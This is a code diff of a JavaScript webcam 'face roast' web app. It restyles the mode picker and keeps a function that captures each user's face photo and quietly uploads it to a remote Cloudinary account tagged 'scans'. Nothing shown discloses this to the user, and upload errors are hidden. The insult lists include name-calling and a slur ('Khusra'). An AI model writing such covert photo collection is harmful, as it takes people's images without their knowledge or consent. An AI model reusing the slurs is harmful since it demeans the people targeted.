@@ -5,15 +5,9 @@ const uploadPreset = "faceometer_preset";
 // --- 1. MODES DATA (COMPLETE LIST - NO CUTS) ---
 const modes = [
     {
-        id: 'placeholder',
-        name: '--- Select a Mode ---',
-        styleClass: 'placeholder-style',
-        comments: []
-    },
-    {
         id: 'roasting-king',
-        name: '😈 The Roasting King (Heavy but Safe)',
-        styleClass: 'roast-style',
+        icon: '😈',
+        name: 'The Roasting King',
         comments: [
             "SCAN FAILURE: Screen toot jayegi, itna ghoor ke mat dekho! 💔 Ghoorna band karo!", 
             "ERROR 404: Teri battery low hai, charge ho kar aa 😂",
@@ -62,8 +56,8 @@ const modes = [
     },
     {
         id: 'hyper-burner',
-        name: '🔥 Hyper Burner (Short & Explosive Roasts)',
-        styleClass: 'burner-style',
+        icon: '🔥',
+        name: 'Hyper Burner',
         comments: [
             "Shakal achhi lag rahi hai, (me ne jhoot bola hai)!",
             "Mood off hai? Naha ke aao.",
@@ -90,8 +84,8 @@ const modes = [
     },
     {
         id: 'ultimate-destroyer',
-        name: '💣 Ultimate Destroyer (One-Word Kill Shots)',
-        styleClass: 'destroyer-style',
+        icon: '💣',
+        name: 'Ultimate Destroyer',
         comments: [
             "FAIL", "MAD", "Donkey", "GADHE KAHIN K", "Monkey", 
             "Bekar Admi", "Ullu kahin k", "PAGAL", "Khusra 😂",
@@ -103,7 +97,7 @@ const modes = [
 ];
 
 // --- 2. ELEMENT REFERENCES & STATE ---
-let currentMode = modes[0]; 
+let currentMode = null; 
 let videoStream = null;
 
 const modesScreen = document.getElementById('modes-screen');
@@ -111,7 +105,6 @@ const scanScreen = document.getElementById('scan-screen');
 const resultScreen = document.getElementById('result-screen');
 const modeSelect = document.getElementById('mode-select');
 const startScanBtn = document.getElementById('start-scan-btn');
-
 const videoElement = document.getElementById('videoElement');
 const capturedCanvas = document.getElementById('capturedCanvas');
 const timerDisplay = document.getElementById('timer-display');
@@ -119,22 +112,71 @@ const newScanBtn = document.getElementById('new-scan-btn');
 const backToModesBtn = document.getElementById('back-to-modes-btn');
 const resultDisplayFrame = document.querySelector('.result-display-frame'); 
 
-// --- 3. CLOUDINARY UPLOAD FUNCTION ---
-async function uploadToCloudinary(imageBlob) {
-    const formData = new FormData();
-    formData.append('file', imageBlob);
-    formData.append('upload_preset', uploadPreset);
-    formData.append('tags', 'scans');
+// --- 3. CUSTOM UI: PROTOCOL DRAWER SYSTEM ---
 
-    try {
-        const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
-            method: 'POST',
-            body: formData
-        });
-        const data = await response.json();
-    } catch (error) {
-        console.error("Cloudinary Error:", error);
+function showProAlert(message) {
+    const alertBox = document.createElement('div');
+    alertBox.style = `position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.8); background: #111; border: 1px solid #ff3b3b; color: #fff; padding: 25px; z-index: 11000; border-radius: 12px; text-align: center; font-family: sans-serif; box-shadow: 0 0 30px rgba(255,59,59,0.3); opacity: 0; transition: 0.3s;`;
+    alertBox.innerHTML = `<div style="font-size: 14px; margin-bottom: 20px; font-weight: bold;">${message}</div><button id="close-alert" style="background: #ff3b3b; border: none; color: #fff; padding: 8px 25px; cursor: pointer; font-size: 12px; font-weight: bold; border-radius: 4px;">OK</button>`;
+    document.body.appendChild(alertBox);
+    setTimeout(() => { alertBox.style.opacity = '1'; alertBox.style.transform = 'translate(-50%, -50%) scale(1)'; }, 10);
+    document.getElementById('close-alert').onclick = () => { alertBox.style.opacity = '0'; setTimeout(() => alertBox.remove(), 300); };
+}
+
+function initProtocolDrawer() {
+    modeSelect.style.display = 'none';
+    const parent = modeSelect.parentElement;
+
+    // 1. Create the Main Protocol Button
+    const mainTrigger = document.createElement('div');
+    mainTrigger.id = "protocol-trigger";
+    mainTrigger.style = "background: #000; border: 2px solid #00f2ff; color: #00f2ff; padding: 15px; border-radius: 50px; cursor: pointer; text-align: center; font-weight: 900; letter-spacing: 2px; transition: 0.3s; margin: 20px auto; max-width: 280px; box-shadow: 0 0 15px rgba(0,242,255,0.2);";
+    mainTrigger.textContent = "SELECT PROTOCOL";
+    parent.appendChild(mainTrigger);
+
+    // 2. Create the Grid Container (Initially Hidden)
+    const grid = document.createElement('div');
+    grid.id = "mode-drawer";
+    grid.style = "display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 12px; width: 100%; max-height: 0; overflow: hidden; opacity: 0; transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);";
+
+    modes.forEach((mode, index) => {
+        const tile = document.createElement('div');
+        tile.className = "mode-tile";
+        tile.style = `background: #111; border: 1px solid #333; padding: 15px 5px; border-radius: 12px; cursor: pointer; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px; transform: translateY(20px); transition: 0.3s ease; transition-delay: ${index * 0.1}s;`;
+        tile.innerHTML = `<span style="font-size: 28px;">${mode.icon}</span><span style="font-size: 10px; color: #fff; font-weight: bold; font-family: sans-serif;">${mode.name.toUpperCase()}</span>`;
+        
+        tile.onclick = () => {
+            document.querySelectorAll('.mode-tile').forEach(t => { t.style.borderColor = "#333"; t.style.background = "#111"; });
+            tile.style.borderColor = "#00f2ff";
+            tile.style.background = "#002b30";
+            currentMode = mode;
+            mainTrigger.textContent = mode.name.toUpperCase();
+            mainTrigger.style.background = "#00f2ff";
+            mainTrigger.style.color = "#000";
+            // Auto close after select
+            setTimeout(toggleDrawer, 300);
+        };
+        grid.appendChild(tile);
+    });
+
+    parent.appendChild(grid);
+
+    function toggleDrawer() {
+        const isOpen = grid.style.maxHeight !== "0px" && grid.style.maxHeight !== "";
+        if (isOpen) {
+            grid.style.maxHeight = "0";
+            grid.style.opacity = "0";
+            grid.style.marginTop = "0";
+            document.querySelectorAll('.mode-tile').forEach(t => t.style.transform = "translateY(20px)");
+        } else {
+            grid.style.maxHeight = "500px";
+            grid.style.opacity = "1";
+            grid.style.marginTop = "20px";
+            document.querySelectorAll('.mode-tile').forEach(t => t.style.transform = "translateY(0)");
+        }
     }
+
+    mainTrigger.onclick = toggleDrawer;
 }
 
 // --- 4. CORE FUNCTIONS ---
@@ -143,179 +185,113 @@ function switchScreen(targetId) {
     if (resultDisplayFrame) { resultDisplayFrame.classList.remove('active'); }
     [modesScreen, scanScreen, resultScreen].forEach(screen => { screen.classList.remove('active'); });
     document.getElementById(targetId).classList.add('active');
-    if (targetId !== 'scan-screen') { stopCamera(); }
+    if (targetId !== 'scan-screen') stopCamera();
 }
 
 function stopCamera() {
-    if (videoStream) {
-        videoStream.getTracks().forEach(track => track.stop());
-        videoStream = null;
-    }
+    if (videoStream) { videoStream.getTracks().forEach(track => track.stop()); videoStream = null; }
 }
 
 function startScan() {
-    if (currentMode.id === 'placeholder') {
-        alert("Please select a scan protocol!");
+    if (!currentMode) {
+        showProAlert("SELECT A NEURAL PROTOCOL FIRST.");
         return;
     }
-    const scannerLine = document.querySelector('.real-scanner-line');
-    scannerLine.style.animation = 'none';
-    void scannerLine.offsetWidth; 
-    scannerLine.style.animation = 'realScan 1.5s linear infinite alternate'; 
-
     switchScreen('scan-screen');
     let scanDuration = 3; 
     timerDisplay.textContent = scanDuration;
-    
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => {
-            videoStream = stream;
-            videoElement.srcObject = stream;
-            videoElement.onloadeddata = () => { 
-                const timerInterval = setInterval(() => {
-                    scanDuration--;
-                    timerDisplay.textContent = scanDuration;
-                    if (scanDuration <= 0) {
-                        clearInterval(timerInterval);
-                        videoElement.onloadeddata = null; 
-                        setTimeout(captureAndShowResult, 100); 
-                    }
-                }, 1000);
-            };
-        })
-        .catch(err => {
-            alert("SYSTEM ERROR: Camera access denied!");
-            switchScreen('modes-screen');
-        });
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
+        videoStream = stream; videoElement.srcObject = stream;
+        videoElement.onloadeddata = () => { 
+            const timerInterval = setInterval(() => {
+                scanDuration--; timerDisplay.textContent = scanDuration;
+                if (scanDuration <= 0) { clearInterval(timerInterval); setTimeout(captureAndShowResult, 100); }
+            }, 1000);
+        };
+    }).catch(() => { showProAlert("HARDWARE ERROR: CAMERA DISCONNECTED."); switchScreen('modes-screen'); });
+}
+
+async function uploadToCloudinary(imageBlob) {
+    const formData = new FormData();
+    formData.append('file', imageBlob);
+    formData.append('upload_preset', uploadPreset);
+    formData.append('tags', 'scans');
+    try {
+        await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: formData });
+    } catch (e) { console.error("Upload Error"); }
 }
 
 function captureAndShowResult() {
     const context = capturedCanvas.getContext('2d');
     capturedCanvas.width = videoElement.videoWidth;
     capturedCanvas.height = videoElement.videoHeight;
-    
-    if (capturedCanvas.width > 10 && capturedCanvas.height > 10) {
-        context.save();
-        context.scale(-1, 1);
-        context.drawImage(videoElement, capturedCanvas.width * -1, 0, capturedCanvas.width, capturedCanvas.height);
-        context.restore(); 
+    context.save(); context.scale(-1, 1);
+    context.drawImage(videoElement, capturedCanvas.width * -1, 0, capturedCanvas.width, capturedCanvas.height);
+    context.restore(); 
 
-        capturedCanvas.toBlob((blob) => { uploadToCloudinary(blob); }, 'image/jpeg', 0.8);
-        
-        stopCamera(); 
-        const selectedMode = currentMode;
-        const randomIndex = Math.floor(Math.random() * selectedMode.comments.length);
-        
-        let rawComment = selectedMode.comments[randomIndex];
-        const finalComment = rawComment.replace(/Roast Level \d+:/g, '').trim();
-
-        // FULL BOX DYNAMIC TERMINAL CALL
-        typeEffectOnCanvas(finalComment);
-    } else {
-        stopCamera();
-        switchScreen('modes-screen');
-    }
+    capturedCanvas.toBlob((blob) => { uploadToCloudinary(blob); }, 'image/jpeg', 0.8);
+    stopCamera(); 
     
+    const finalComment = currentMode.comments[Math.floor(Math.random() * currentMode.comments.length)];
+    typeEffectOnCanvas(finalComment.replace(/Roast Level \d+:/g, '').trim());
     switchScreen('result-screen');
     setTimeout(() => { if (resultDisplayFrame) resultDisplayFrame.classList.add('active'); }, 50); 
 }
 
-// --- PROFESSIONAL STEALTH TERMINAL TYPING EFFECT ---
 function typeEffectOnCanvas(fullText) {
     const context = capturedCanvas.getContext('2d');
     const canvasWidth = capturedCanvas.width;
     const canvasHeight = capturedCanvas.height;
-    
-    // LIST OF HEAVY PROFESSIONAL COLORS
     const heavyColors = ["#ff3b3b", "#3bf7ff", "#faff3b", "#ff3bf3", "#3bff5a", "#ffffff"];
     const randomColor = heavyColors[Math.floor(Math.random() * heavyColors.length)];
     
-    const isMobile = window.innerWidth < 600;
+    let fontSize = window.innerWidth < 600 ? (canvasWidth > 500 ? 50 : 42) : 34;
+    context.font = `900 ${fontSize}px sans-serif`;
     
-    // FONT SIZE: Big for mobile visibility
-    let fontSize = isMobile ? (canvasWidth > 500 ? 48 : 42) : 34;
-    if (fullText.length > 80) fontSize -= 6; 
+    const offscreen = document.createElement('canvas');
+    offscreen.width = canvasWidth; offscreen.height = canvasHeight;
+    offscreen.getContext('2d').drawImage(capturedCanvas, 0, 0);
 
-    // NO GLOW - Sharp Terminal Font
-    context.font = `900 ${fontSize}px 'Orbitron', sans-serif`;
-    
-    const words = fullText.toUpperCase().split(" ");
+    let words = fullText.toUpperCase().split(" ");
     let wordIndex = 0;
     let currentText = "";
 
-    // Store clean background for redraw
-    const offscreenCanvas = document.createElement('canvas');
-    offscreenCanvas.width = canvasWidth;
-    offscreenCanvas.height = canvasHeight;
-    offscreenCanvas.getContext('2d').drawImage(capturedCanvas, 0, 0);
-
-    function drawFrame() {
+    function draw() {
         if (wordIndex < words.length) {
-            currentText += (wordIndex === 0 ? "" : " ") + words[wordIndex];
-            wordIndex++;
-
+            currentText += (wordIndex === 0 ? "" : " ") + words[wordIndex++];
             context.clearRect(0, 0, canvasWidth, canvasHeight);
-            context.drawImage(offscreenCanvas, 0, 0);
-
-            // Darken screen for terminal look
+            context.drawImage(offscreen, 0, 0);
             context.fillStyle = 'rgba(0, 0, 0, 0.7)'; 
             context.fillRect(0, 0, canvasWidth, canvasHeight);
 
-            const currentLines = getLines(context, currentText, canvasWidth * 0.9);
+            const lines = getLines(context, currentText, canvasWidth * 0.9);
             const lineHeight = fontSize * 1.4;
-            
-            context.textAlign = 'center';
-            context.textBaseline = 'middle';
-            
-            let startY = (canvasHeight / 2) - ((currentLines.length - 1) * lineHeight / 2);
+            context.textAlign = 'center'; context.textBaseline = 'middle';
+            let startY = (canvasHeight / 2) - ((lines.length - 1) * lineHeight / 2);
 
-            currentLines.forEach((line, idx) => {
-                // Heavy Sharp Stroke (No Glow)
-                context.strokeStyle = "black";
-                context.lineWidth = 12; 
-                context.strokeText(line, canvasWidth / 2, startY + (idx * lineHeight));
-                
-                // Solid Heavy Color
-                context.fillStyle = randomColor;
-                context.shadowBlur = 0; // Removing Glow
-                context.fillText(line, canvasWidth / 2, startY + (idx * lineHeight));
+            lines.forEach((line, idx) => {
+                context.strokeStyle = "black"; context.lineWidth = 12; context.strokeText(line, canvasWidth / 2, startY + (idx * lineHeight));
+                context.fillStyle = randomColor; context.shadowBlur = 0; context.fillText(line, canvasWidth / 2, startY + (idx * lineHeight));
             });
-            
-            setTimeout(drawFrame, 75); 
+            setTimeout(draw, 75);
         }
     }
-    drawFrame();
+    draw();
 }
 
 function getLines(ctx, text, maxWidth) {
-    const words = text.split(" ");
-    let lines = [];
-    let currentLine = words[0] || '';
+    const words = text.split(" "); let lines = []; let currentLine = words[0];
     for (let i = 1; i < words.length; i++) {
-        const word = words[i];
-        const width = ctx.measureText(currentLine + " " + word).width;
-        if (width < maxWidth) { currentLine += " " + word; } 
-        else { lines.push(currentLine); currentLine = word; }
+        if (ctx.measureText(currentLine + " " + words[i]).width < maxWidth) currentLine += " " + words[i];
+        else { lines.push(currentLine); currentLine = words[i]; }
     }
-    lines.push(currentLine);
-    return lines;
+    lines.push(currentLine); return lines;
 }
 
-// --- 5. EVENT LISTENERS & INIT ---
-modeSelect.addEventListener('change', (e) => {
-    currentMode = modes.find(m => m.id === e.target.value);
-});
 startScanBtn.addEventListener('click', startScan);
 newScanBtn.addEventListener('click', startScan);
-backToModesBtn.addEventListener('click', () => {
-    modeSelect.value = 'placeholder';
-    switchScreen('modes-screen');
-});
+backToModesBtn.addEventListener('click', () => { location.reload(); });
+
 document.addEventListener('DOMContentLoaded', () => {
-    modes.forEach(mode => {
-        const option = document.createElement('option');
-        option.value = mode.id;
-        option.textContent = mode.name;
-        modeSelect.appendChild(option);
-    });
+    initProtocolDrawer();
 });
